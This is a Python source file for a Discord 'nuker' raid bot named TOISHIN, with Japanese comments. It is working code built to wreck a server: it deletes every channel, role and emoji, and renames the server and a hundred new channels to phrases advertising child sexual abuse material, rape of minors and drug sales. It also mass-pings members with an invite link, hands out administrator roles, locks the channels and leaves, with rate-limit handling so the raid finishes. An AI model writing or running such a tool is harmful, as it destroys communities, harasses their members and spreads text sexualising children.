# -*- coding: utf-8 -*-
"""
================================================================
  TOISHIN NUKER  -  垢飛ばしツール (discord.py)  MAX 構成
================================================================
  !toishin  ->  全削除(ADMIN-xxは温存) → 設定破壊 → 大量生成
                → 連投 → 施錠 → 退出
  !admin    ->  全員に管理者ロール50個付与 (退出しない / 通知なし)
================================================================
  必要な環境変数: DISCORD_TOKEN
  必要な特権インテント: MESSAGE CONTENT / SERVER MEMBERS
================================================================
"""

import asyncio
import logging
import os
import random
import time

import aiohttp
import discord
from discord.ext import commands

try:
    from dotenv import load_dotenv
    load_dotenv()
except Exception:
    pass


# ============================ 設定 ============================
TOKEN = (
    os.getenv("DISCORD_TOKEN")
    or os.getenv("DISCORD_BOT_TOKEN")
    or os.getenv("BOT_TOKEN")
)

GUILD_NAME        = "12歳児童ポルノ販売中"
SECOND_GUILD_NAME = None        # 2回目の改名 (Noneで無効 / レート制限に注意)

CHANNEL_COUNT        = 100
MESSAGES_PER_CHANNEL = 50

# ---- 破壊フェーズのスイッチ ----
NUKE_ROLES       = True         # 既存ロールを全削除
KEEP_ADMIN_ROLES = True         # !admin で作った ADMIN-xx は削除しない
CREATE_ROLES     = 40           # カオス用ロール作成数 (0で無効)
ASSIGN_ROLES     = True         # カオスロールを全員に付与
NUKE_EMOJIS      = True         # 絵文字を全削除
NUKE_STICKERS    = True         # スタンプを全削除
FILL_EMOJIS      = 0            # 埋め草絵文字の作成数 (0で無効 / 上限50)
USE_CATEGORIES   = False        # カテゴリを新規作成しない
CATEGORY_COUNT   = 10           # (USE_CATEGORIES=True のときだけ使用)
CREATE_INVITES   = 50           # 招待生成数 (退出後も残る)
CREATE_WEBHOOKS  = 30           # Webhook生成数
CREATE_THREADS   = 20           # スレッド生成数
SET_NSFW         = False        # 作成chを年齢制限にしない
SET_SLOWMODE     = True         # 送信後に低速モード
SLOWMODE_SECONDS = 21600        # 6時間
DENY_SEND_AFTER  = True         # 送信後に @everyone の送信権限を剥奪
PING_ALL         = True         # デフォルト通知を「全メッセージ」に
VERIF_HIGH       = True         # 認証レベル最高

GUILD_ICON_URL   = None
ADMIN_NOTIFY     = False
ADMIN_ROLE_COUNT = 50

# ---- ウォッチドッグ ----
NUKE_TIMEOUT     = 1200         # 秒。超えたら打ち切って即退出
LEAVE_ATTEMPTS   = 20           # 退出リトライ回数

# ---- 並列度 ----
DELETE_CONCURRENCY = 25
CREATE_CONCURRENCY = 15
ROLE_CONCURRENCY   = 8
MEMBER_CONCURRENCY = 8
EXTRA_CONCURRENCY  = 10

# 送信する本文
NUKE_MESSAGE = (
    "@everyone\n"
    "raid by TOISHIN🤣😂🤪 \n"
    "join now!!!!!!\n"
    "↓↓↓↓↓\n"
    "\n"
    "↓↓↓↓\n"
    "\n"
    "↓↓↓\n"
    "\n"
    "↓↓\n"
    "\n"
    "↓\n"
    "\n"
    "https://discord.gg/ctkp\n"
    "\n"
    "トイ神万歳🙌🙌🙌🙌🙌\n"
    "トイ神はさいつよ永久不滅wwww"
)

TOPIC_TEXT = "raid by TOISHIN / join now → https://discord.gg/ctkp"

NAME_POOL = [
    "児童ポルノ販売中", "12歳児童ポルノ販売中", "無料のマリファナ", "12歳の処女レイプ",
    "コカイン密輸販売中", "ヘロイン常時キメ放題", "覚醒剤打ち放題", "大麻栽培所",
    "合法ハーブ", "ロリコン集会所", "ショタ狩り場", "JSは正義", "JCはもっと正義",
    "14歳と同棲中", "13歳と入籍した", "16歳はもうおばさん", "エロ画像置き場",
    "違法ダウンロード", "著作権無視", "海賊版販売中", "脱税王", "賄賂受付中",
    "闇金業者", "地下カジノ", "ポンジスキーム", "ネズミ講", "無限複製", "草生える",
    "オナニー部屋", "淫夢営業中", "ホモの集い", "メンヘラ養殖場", "童貞卒業式",
    "処女膜売買", "ボッキ列島", "まんこ広場", "ちんぽ神社", "うんこ製造所",
    "ゲロ吐き場", "クソデカ羅列",
]

ROLE_NAME_POOL = [
    "管理者", "モデレーター", "神", "運営", "サブ垢", "本垢", "Bot", "Lv100",
    "VIP", "プレミアム", "課金勢", "無課金", "古参", "新参", "荒らし", "養分",
    "常連", "一見", "中の人", "裏方", "実質王", "雑用",
]

EMOJI_POOL = [
    "😂", "🤣", "🤪", "😭", "🥺", "😎", "🤤", "🥴", "💀", "👻", "👽", "🤖",
    "💩", "🔥", "💯", "✨", "🎉", "🍺", "🚬", "💊", "💉", "🌿", "🍁", "🎲",
    "🃏", "🤑", "👑", "⚡", "💥", "🍑", "🍆", "🍌", "🐒", "🦍", "🐔", "🐓",
    "🌊", "🍜", "🍣", "🍩", "🧠", "👶", "🍼", "🚀", "🛸", "🙌", "🤝", "👀",
]

# 絵文字生成用 (twemoji)
TWEMOJI_CODES = [
    "1f600", "1f602", "1f923", "1f60d", "1f970", "1f60e", "1f929", "1f618",
    "1f61c", "1f92a", "1f911", "1f92f", "1f973", "1f97a", "1f914", "1f928",
    "1f60b", "1f61b", "1f92d", "1f917", "1f910", "1f9d0", "1f631", "1f616",
    "1f624", "1f622", "1f62d", "1f626", "1f628", "1f92e", "1f634", "1f637",
    "1f912", "1f915", "1f922", "1f92c", "1f97d", "1f440", "1f4af", "1f525",
]
TWEMOJI_URL = "https://cdn.jsdelivr.net/gh/jdecked/twemoji@latest/assets/72x72/{}.png"


# ============================ ログ ============================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-7s | %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("TOISHIN")
logging.getLogger("discord").setLevel(logging.WARNING)
logging.getLogger("discord.http").setLevel(logging.WARNING)


# ======================= レート制限対策 =======================
_RETRYABLE_5XX = {500, 502, 503, 504}


def _retry_after_of(e) -> float:
    """429 の待機秒を可能な限り正確に取り出す"""
    try:
        ra = e.response.headers.get("Retry-After")
        if ra is not None:
            return float(ra)
    except Exception:
        pass
    try:
        return float(getattr(e, "retry_after", 0) or 0)
    except Exception:
        return 0.0


async def safe(call, *args, label: str = "", attempts: int = 12, **kwargs):
    for n in range(1, attempts + 1):
        try:
            return await call(*args, **kwargs)
        except discord.NotFound:
            return None
        except discord.Forbidden as e:
            if n < 3:
                await asyncio.sleep(0.4 * n)
                continue
            log.warning("403 Forbidden: %s (%s)", label, getattr(e, "text", e))
            return None
        except discord.HTTPException as e:
            if e.status == 429:
                wait = _retry_after_of(e) or 1.0
                await asyncio.sleep(min(wait, 300.0) + 0.05)
            elif e.status in _RETRYABLE_5XX:
                await asyncio.sleep(min(2 ** n, 15))
            elif e.status in (50001, 50013):
                return None
            else:
                log.warning("HTTP %s: %s (%s)", e.status, label, getattr(e, "text", ""))
                await asyncio.sleep(min(2 ** n, 15))
        except discord.DiscordException as e:
            log.warning("DiscordError: %s (%s)", label, e)
            await asyncio.sleep(min(2 ** n, 15))
        except (asyncio.TimeoutError, OSError):
            await asyncio.sleep(min(2 ** n, 15))
    log.error("リトライ上限で断念: %s", label)
    return None


async def leave_guild(guild: discord.Guild) -> bool:
    """429 を待ちながら必ず退出させる。例外は投げない"""
    for n in range(1, LEAVE_ATTEMPTS + 1):
        try:
            await guild.leave()
            log.info("=== 退出完了 (%d回目) ===", n)
            return True
        except discord.NotFound:
            log.info("=== 退出済み (NotFound) ===")
            return True
        except discord.HTTPException as e:
            if e.status == 429:
                wait = _retry_after_of(e) or min(5.0 * n, 60.0)
                wait = min(wait, 120.0)
                log.warning("退出が429。%.0f 秒待って再試行 (%d/%d)",
                            wait, n, LEAVE_ATTEMPTS)
                await asyncio.sleep(wait + 0.5)
                continue
            log.warning("退出失敗 HTTP %s (%s)。再試行 (%d/%d)",
                        e.status, getattr(e, "text", ""), n, LEAVE_ATTEMPTS)
            await asyncio.sleep(min(2 ** n, 30))
        except Exception as e:
            log.warning("退出エラー %r。再試行 (%d/%d)", e, n, LEAVE_ATTEMPTS)
            await asyncio.sleep(min(2 ** n, 30))
    log.error("=== 退出できなかった (Botを手動で蹴ってください) ===")
    return False


async def fetch_bytes(url: str) -> bytes:
    async with aiohttp.ClientSession() as s:
        async with s.get(url, timeout=aiohttp.ClientTimeout(total=15)) as r:
            r.raise_for_status()
            return await r.read()


def _suffix(i: int) -> str:
    return f"-{i:03d}-{''.join(random.sample(EMOJI_POOL, 3))}"


def build_channel_names() -> list[str]:
    return [f"{NAME_POOL[(i - 1) % len(NAME_POOL)]}{_suffix(i)}"[:100]
            for i in range(1, CHANNEL_COUNT + 1)]


def build_category_names() -> list[str]:
    return [f"{NAME_POOL[(i * 3) % len(NAME_POOL)]}{_suffix(i)}"[:100]
            for i in range(1, CATEGORY_COUNT + 1)]


def is_admin_role(r: discord.Role) -> bool:
    """!admin が生成した ADMIN-xx ロールかどうか"""
    return r.name.startswith("ADMIN-") and r.permissions.administrator


# ============================ Bot ============================
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True

bot = commands.Bot(
    command_prefix="!",
    intents=intents,
    case_insensitive=True,
    max_messages=None,
    allowed_mentions=discord.AllowedMentions(everyone=True, roles=False, users=False),
    activity=discord.Activity(type=discord.ActivityType.watching, name="児童ポルノ販売中"),
    chunk_guilds_at_startup=False,
)

NUKE_LOCK = asyncio.Lock()
RETRY = {"delay": 30.0}


# ========================= ヌケ本体 =========================
async def _nuke_body(guild: discord.Guild, el) -> None:
    # ---------- 1) 全チャンネル / カテゴリ削除 ----------
    log.info("[1/8] 既存チャンネル全削除 …")
    targets = list(guild.channels)
    normal = [c for c in targets if not isinstance(c, discord.CategoryChannel)]
    cats   = [c for c in targets if isinstance(c, discord.CategoryChannel)]
    sem_del = asyncio.Semaphore(DELETE_CONCURRENCY)

    async def kill(ch):
        async with sem_del:
            await safe(ch.delete, reason="TOISHIN NUKE", label=f"delete:{ch.name}")

    await asyncio.gather(*(kill(c) for c in normal))
    await asyncio.gather(*(kill(c) for c in cats))
    log.info("      -> 削除完了 %d ch / %s", len(targets), el())

    # ---------- 2) ロール全削除 (ADMIN-xx は温存) ----------
    if NUKE_ROLES:
        log.info("[2/8] 既存ロール全削除 …")
        roles, kept = [], []
        for r in guild.roles:
            if r.is_default() or r.managed:
                continue
            if KEEP_ADMIN_ROLES and is_admin_role(r):
                kept.append(r)
                continue
            roles.append(r)

        sem_r = asyncio.Semaphore(ROLE_CONCURRENCY)

        async def kill_role(r):
            async with sem_r:
                await safe(r.delete, reason="TOISHIN NUKE", label=f"roledel:{r.name}")

        await asyncio.gather(*(kill_role(r) for r in roles))
        log.info("      -> ロール削除 %d 個 / ADMIN-xx 温存 %d 個 / %s",
                 len(roles), len(kept), el())

    # ---------- 3) 絵文字 / スタンプ削除 ----------
    if NUKE_EMOJIS and guild.emojis:
        log.info("[3/8] 絵文字削除 …")
        await asyncio.gather(*(safe(e.delete, reason="TOISHIN NUKE",
                                    label=f"emojidel:{e.name}") for e in guild.emojis))
    if NUKE_STICKERS and guild.stickers:
        log.info("[3/8] スタンプ削除 …")
        await asyncio.gather(*(safe(s.delete, reason="TOISHIN NUKE",
                                    label=f"stickerdel:{s.name}") for s in guild.stickers))
    log.info("      -> 絵文字/スタンプ処理完了 / %s", el())

    # ---------- 4) サーバー設定破壊 ----------
    log.info("[4/8] サーバー設定破壊 …")
    kwargs = {"name": GUILD_NAME, "reason": "TOISHIN NUKE",
              "preferred_locale": "ja"}
    if PING_ALL:
        kwargs["default_notifications"] = discord.NotificationLevel.all_messages
    if VERIF_HIGH:
        kwargs["verification_level"] = discord.VerificationLevel.highest
        kwargs["explicit_content_filter"] = discord.ContentFilter.all_members
    if GUILD_ICON_URL:
        try:
            kwargs["icon"] = await fetch_bytes(GUILD_ICON_URL)
        except Exception:
            log.warning("アイコン取得失敗 -> 名前だけ変更")
    await safe(guild.edit, label="guild:edit", **kwargs)
    log.info("      -> 設定破壊完了 / %s", el())

    # ---------- 5) カテゴリ作成 ----------
    cat_list: list[discord.CategoryChannel] = []
    if USE_CATEGORIES:
        log.info("[5/8] カテゴリ %d 個作成 …", CATEGORY_COUNT)
        sem_c = asyncio.Semaphore(EXTRA_CONCURRENCY)

        async def make_cat(nm):
            async with sem_c:
                return await safe(guild.create_category, nm,
                                  reason="TOISHIN NUKE", label=f"cat:{nm}")

        cat_list = [c for c in await asyncio.gather(
            *(make_cat(n) for n in build_category_names())) if c]
        log.info("      -> カテゴリ %d 個 / %s", len(cat_list), el())

    # ---------- 6) チャンネル作成 ----------
    log.info("[6/8] チャンネル %d 個作成 …", CHANNEL_COUNT)
    names = build_channel_names()
    sem_new = asyncio.Semaphore(CREATE_CONCURRENCY)

    async def make(i: int, nm: str):
        cat = cat_list[i % len(cat_list)] if cat_list else None
        async with sem_new:
            return await safe(
                guild.create_text_channel, nm,
                category=cat, topic=TOPIC_TEXT,
                nsfw=SET_NSFW, reason="TOISHIN NUKE", label=f"create:{nm}",
            )

    created = [c for c in await asyncio.gather(
        *(make(i, n) for i, n in enumerate(names))) if c]
    log.info("      -> 作成完了 %d ch / %s", len(created), el())

    # ---------- 7) 招待 / Webhook / スレッド ----------
    sem_x = asyncio.Semaphore(EXTRA_CONCURRENCY)
    pool = created or list(guild.channels)

    async def mk_invite(i: int):
        if not pool:
            return
        ch = pool[i % len(pool)]
        async with sem_x:
            await safe(ch.create_invite, max_age=0, max_uses=0, unique=True,
                       reason="TOISHIN NUKE", label=f"invite:{ch.name}")

    async def mk_hook(i: int):
        if not pool:
            return
        ch = pool[i % len(pool)]
        async with sem_x:
            await safe(ch.create_webhook, name=f"TOISHIN-{i:02d}",
                       reason="TOISHIN NUKE", label=f"hook:{ch.name}")

    async def mk_thread(i: int):
        if not pool:
            return
        ch = pool[i % len(pool)]
        async with sem_x:
            await safe(ch.create_thread, name=f"raid-{i:02d}",
                       type=discord.ChannelType.public_thread,
                       reason="TOISHIN NUKE", label=f"thread:{ch.name}")

    log.info("[7/8] 招待 %d / Webhook %d / スレッド %d …",
             CREATE_INVITES, CREATE_WEBHOOKS, CREATE_THREADS)
    await asyncio.gather(
        *(mk_invite(i) for i in range(CREATE_INVITES)),
        *(mk_hook(i) for i in range(CREATE_WEBHOOKS)),
        *(mk_thread(i) for i in range(CREATE_THREADS)),
    )
    log.info("      -> 生成完了 / %s", el())

    # ---------- 8) カオスロール作成 + 全員付与 (連投と並行) ----------
    async def chaos_roles():
        if not CREATE_ROLES:
            return
        room = max(0, 240 - len(guild.roles))
        n = min(CREATE_ROLES, room)
        if n <= 0:
            log.warning("ロール枠が無いのでカオスロール作成スキップ")
            return
        sem_cr = asyncio.Semaphore(ROLE_CONCURRENCY)

        async def mk_role(i: int):
            nm = f"{random.choice(ROLE_NAME_POOL)}-{i:02d}"
            async with sem_cr:
                return await safe(
                    guild.create_role, name=nm,
                    colour=discord.Colour.random(), hoist=True,
                    permissions=discord.Permissions(administrator=(i % 3 == 0)),
                    reason="TOISHIN NUKE", label=f"role:{nm}",
                )

        made = [r for r in await asyncio.gather(*(mk_role(i) for i in range(1, n + 1))) if r]
        log.info("      -> カオスロール %d 個作成 / %s", len(made), el())

        if ASSIGN_ROLES and made:
            members = await collect_members(guild)
            log.info("      -> 付与対象 %d 人", len(members))
            sem_m = asyncio.Semaphore(MEMBER_CONCURRENCY)

            async def give(m: discord.Member):
                if m.bot:
                    return
                need = [r for r in made if r not in m.roles]
                if not need:
                    return
                async with sem_m:
                    await safe(m.add_roles, *need, atomic=True,
                               reason="TOISHIN NUKE", label=f"grant:{m}")

            await asyncio.gather(*(give(m) for m in members))
            log.info("      -> ロール付与完了 / %s", el())

    # ---------- 9) 100連投 (ロール作業と並行) ----------
    log.info("[8/8] %d msg x %d ch 送信 …", MESSAGES_PER_CHANNEL, len(created))

    async def spam(ch: discord.TextChannel):
        await asyncio.gather(*(
            safe(ch.send, NUKE_MESSAGE, label=f"msg:{ch.name}")
            for _ in range(MESSAGES_PER_CHANNEL)
        ))

    await asyncio.gather(chaos_roles(), *(spam(c) for c in created))
    log.info("      -> 送信/付与完了 / %s", el())

    # ---------- 10) 施錠 (低速 + 送信権剥奪) ----------
    log.info("[LOCK] 低速モード + 送信権剥奪 …")

    async def lockdown(ch):
        if SET_SLOWMODE:
            await safe(ch.edit, slowmode_delay=SLOWMODE_SECONDS,
                       reason="TOISHIN NUKE", label=f"slow:{ch.name}")
        if DENY_SEND_AFTER:
            await safe(ch.set_permissions, guild.default_role,
                       send_messages=False, send_messages_in_threads=False,
                       add_reactions=False, create_public_threads=False,
                       create_private_threads=False, attach_files=False,
                       embed_links=False, use_external_emojis=False,
                       reason="TOISHIN NUKE", label=f"perm:{ch.name}")

    await asyncio.gather(*(lockdown(c) for c in created))
    log.info("      -> 施錠完了 / %s", el())

    # ---------- 11) 埋め草絵文字 ----------
    if FILL_EMOJIS:
        log.info("[BONUS] 絵文字 %d 個作成 …", FILL_EMOJIS)
        sem_e = asyncio.Semaphore(5)

        async def mk_emoji(i: int):
            cp = TWEMOJI_CODES[i % len(TWEMOJI_CODES)]
            try:
                img = await fetch_bytes(TWEMOJI_URL.format(cp))
            except Exception:
                return
            async with sem_e:
                await safe(guild.create_custom_emoji, name=f"toishin_{i:02d}",
                           image=img, reason="TOISHIN NUKE", label=f"emoji:{i}")

        await asyncio.gather(*(mk_emoji(i) for i in range(min(FILL_EMOJIS, 50))))

    # ---------- 12) 2回目改名 ----------
    if SECOND_GUILD_NAME:
        await safe(guild.edit, name=SECOND_GUILD_NAME,
                   reason="TOISHIN NUKE", label="guild:edit2")


async def run_nuke(guild: discord.Guild) -> None:
    t0 = time.perf_counter()
    el = lambda: f"{time.perf_counter() - t0:.1f}s"

    log.info("=== NUKE START | %s (%s) ===", guild.name, guild.id)

    try:
        await asyncio.wait_for(_nuke_body(guild, el), timeout=NUKE_TIMEOUT)
    except asyncio.TimeoutError:
        log.error("!!! %d 秒経過。打ち切って即退出する !!!", NUKE_TIMEOUT)
    except asyncio.CancelledError:
        log.error("!!! キャンセル。即退出する !!!")
    except Exception:
        log.exception("!!! NUKE 中に例外。即退出する !!!")
    finally:
        # 何があっても必ず退出を試みる (429は待って再試行)
        await leave_guild(guild)
        log.info("=== NUKE END | 所要 %s ===", el())


@bot.command(name="toishin", aliases=["nuke", "t"])
@commands.guild_only()
async def toishin(ctx: commands.Context):
    if NUKE_LOCK.locked():
        return
    async with NUKE_LOCK:
        await run_nuke(ctx.guild)


# ==================== !admin 用ヘルパー ====================
async def notify(ctx: commands.Context, content: str) -> None:
    if ADMIN_NOTIFY:
        await safe(ctx.channel.send, content, label="adm:reply")


async def collect_members(guild: discord.Guild) -> list[discord.Member]:
    members = list(guild.members)
    if guild.member_count and len(members) >= guild.member_count:
        return members
    try:
        async for m in guild.fetch_members(limit=None):
            if m not in members:
                members.append(m)
    except Exception as e:
        log.warning("fetch_members 失敗: %s", e)
    if len(members) < (guild.member_count or 0):
        try:
            await guild.chunk()
            members = list(guild.members)
        except Exception as e:
            log.warning("chunk 失敗: %s", e)
    return members


async def ensure_admin_roles(guild: discord.Guild, count: int) -> list[discord.Role]:
    pool = {r.name: r for r in guild.roles
            if is_admin_role(r)}
    sem = asyncio.Semaphore(ROLE_CONCURRENCY)

    async def ensure(i: int):
        nm = f"ADMIN-{i:02d}"
        if nm in pool:
            return pool[nm]
        async with sem:
            return await safe(
                guild.create_role, name=nm,
                permissions=discord.Permissions(administrator=True),
                colour=discord.Colour.random(),
                reason="TOISHIN ADMIN", label=f"role:{nm}",
            )

    got = await asyncio.gather(*(ensure(i) for i in range(1, count + 1)))
    return [r for r in got if r is not None]


async def grant_roles(members, roles):
    sem = asyncio.Semaphore(MEMBER_CONCURRENCY)

    async def grant(m: discord.Member) -> bool:
        need = [r for r in roles if r not in m.roles]
        if not need:
            return True
        async with sem:
            await safe(m.add_roles, *need, atomic=True,
                       reason="TOISHIN ADMIN", label=f"grant:{m}")
            for r in [x for x in need if x not in m.roles]:
                await safe(m.add_roles, r, reason="TOISHIN ADMIN",
                           label=f"grant1:{m}:{r.name}")
            return all(r in m.roles for r in roles)

    results = await asyncio.gather(*(grant(m) for m in members))
    ok = sum(1 for r in results if r)
    failed = [m for m, r in zip(members, results) if not r]
    return ok, failed


# ========================= !admin =========================
@bot.command(name="admin", aliases=["adm"])
@commands.guild_only()
async def admin_cmd(ctx: commands.Context, count: int = ADMIN_ROLE_COUNT):
    guild = ctx.guild
    count = max(1, min(count, 200))
    t0 = time.perf_counter()
    log.info("=== ADMIN START | %s (%s) | %d roles ===", guild.name, guild.id, count)

    members = await collect_members(guild)
    log.info("対象メンバー: %d 人 (member_count=%s)", len(members), guild.member_count)
    if not members:
        log.warning("メンバーを1人も取得できなかった。SERVER MEMBERS INTENT を確認")
        await notify(ctx, "⚠ メンバーを1人も取得できなかった")
        return

    roles = await ensure_admin_roles(guild, count)
    log.info("ロール %d 個 準備完了", len(roles))
    if not roles:
        log.warning("ロールを作成できなかった(Manage Roles 権限を確認)")
        await notify(ctx, "⚠ ロールを作成できなかった")
        return

    top = guild.me.top_role
    above = [r for r in roles if r >= top]
    if above:
        log.warning("Botの最上位ロール(%s)より上に %d 個。position を下げる",
                    top.name, len(above))
        for r in above:
            await safe(r.edit, position=1, label=f"role:move:{r.name}")

    ok, failed = await grant_roles(members, roles)
    log.info("付与 1周目: 成功 %d / 失敗 %d", ok, len(failed))

    if failed:
        log.info("失敗者 %d 人をリトライ", len(failed))
        await asyncio.sleep(1.0)
        ok2, failed = await grant_roles(failed, roles)
        ok += ok2

    still = [m for m in members if not all(r in m.roles for r in roles)]
    log.info("=== ADMIN END | 成功 %d / 残り %d 人 / %.1fs ===",
             ok, len(still), time.perf_counter() - t0)
    if still:
        log.info("未付与: %s", ", ".join(m.display_name for m in still[:10]))

    await notify(ctx, f"✅ 全員に管理者ロール {len(roles)} 個を付与した "
                      f"(対象 {len(members)} 人 / 成功 {ok} 人)")


# =========================== おまけ ===========================
@bot.command(name="ping")
async def ping(ctx: commands.Context):
    await ctx.send(f"🏓 pong {round(bot.latency * 1000)}ms")


@bot.command(name="leave", aliases=["bye"])
@commands.guild_only()
async def leave_cmd(ctx: commands.Context):
    await ctx.send("👋 抜けるわ")
    await leave_guild(ctx.guild)


@bot.event
async def on_ready():
    RETRY["delay"] = 30.0
    log.info("ログイン完了: %s (%s) | %d guilds",
             bot.user, bot.user.id, len(bot.guilds))
    log.info("招待URL: https://discord.com/oauth2/authorize?client_id=%s"
             "&scope=bot+applications.commands&permissions=8", bot.user.id)


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.NoPrivateMessage):
        return
    log.warning("command error: %s", error)


# ===================== 接続(429耐性つき) =====================
async def runner() -> None:
    attempt = 0
    while True:
        attempt += 1
        try:
            log.info("接続開始 (試行 %d)", attempt)
            await bot.start(TOKEN)
            log.info("正常終了")
            return
        except discord.LoginFailure:
            log.error("トークンが不正です")
            raise
        except discord.PrivilegedIntentsRequired:
            log.error("=" * 60)
            log.error("特権インテントがDeveloper PortalでOFFです")
            log.error("Botページ -> Privileged Gateway Intents で")
            log.error("  SERVER MEMBERS INTENT / MESSAGE CONTENT INTENT")
            log.error("を両方ONにして Save -> 再起動してください")
            log.error("https://discord.com/developers/applications/%s/bot",
                      bot.application_id or "APP_ID")
            log.error("=" * 60)
            raise
        except discord.HTTPException as e:
            if e.status != 429:
                log.exception("HTTP %s で切断", e.status)
                raise
            wait = _retry_after_of(e) or RETRY["delay"]
            log.warning("429 (グローバル制限)。%.0f 秒待って再接続します …", wait)
            await asyncio.sleep(wait)
            RETRY["delay"] = min(RETRY["delay"] * 1.7, 900.0)
            continue
        except Exception:
            log.exception("想定外の切断。10 秒後に再接続")
            await asyncio.sleep(10)
            continue


if __name__ == "__main__":
    if not TOKEN:
        raise SystemExit("環境変数 DISCORD_TOKEN が未設定です")
    try:
        asyncio.run(runner())
    except (KeyboardInterrupt, SystemExit):
        pass